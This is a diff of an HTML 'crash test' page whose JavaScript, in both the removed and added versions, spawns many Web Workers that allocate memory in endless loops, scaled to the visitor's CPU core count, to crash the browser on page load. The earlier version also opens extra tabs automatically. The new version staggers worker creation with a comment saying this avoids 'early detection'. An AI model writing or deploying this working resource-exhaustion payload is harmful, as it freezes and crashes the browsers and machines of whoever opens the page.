@@ -1,45 +1,24 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Ultimate Browser Crash Test</title>
+    <title>Final Chrome Crash Test</title>
 </head>
 <body>
-    <h1>Browser Crash Test - Maximum Overload</h1>
-    <p>If your browser crashes, the test was successful.</p>
+    <h1>Final Chrome Crash Test - Multi-Tab Overload</h1>
+    <p>Open multiple tabs of this page for best results.</p>
 
     <script>
         function startWorker() {
-            let code = `onmessage = function() { 
-                let data = [];
-                while (true) { 
-                    data.push(new Float64Array(1e8)); // Allocates massive memory
-                }
-            }`;
+            let code = `let data = []; while (true) { data.push(new Float64Array(1e8)); }`;
             let blob = new Blob([code], { type: "application/javascript" });
-
-            function spawnWorkers() {
-                let worker = new Worker(URL.createObjectURL(blob));
-                worker.postMessage("Start");
-
-                setTimeout(spawnWorkers, 100); // Keep spawning new workers every 100ms
-            }
-
-            for (let i = 0; i < navigator.hardwareConcurrency * 6; i++) { // Use 6x CPU cores
-                spawnWorkers();
-            }
+            let worker = new Worker(URL.createObjectURL(blob));
         }
 
-        function spawnTabs(numTabs) {
-            for (let i = 0; i < numTabs; i++) {
-                window.open(window.location.href, '_blank');
-            }
+        let coreMultiplier = navigator.hardwareConcurrency * 4; // Keep original multiplier
+        for (let i = 0; i < coreMultiplier; i++) {
+            setTimeout(startWorker, i * 200); // Stagger worker creation to avoid early detection
         }
-
-        // 1️⃣ Start aggressive memory & CPU overload
-        startWorker();
-
-        // 2️⃣ Open multiple tabs to distribute the load
-        spawnTabs(6); // Increase this if needed
     </script>
 </body>
 </html>
+
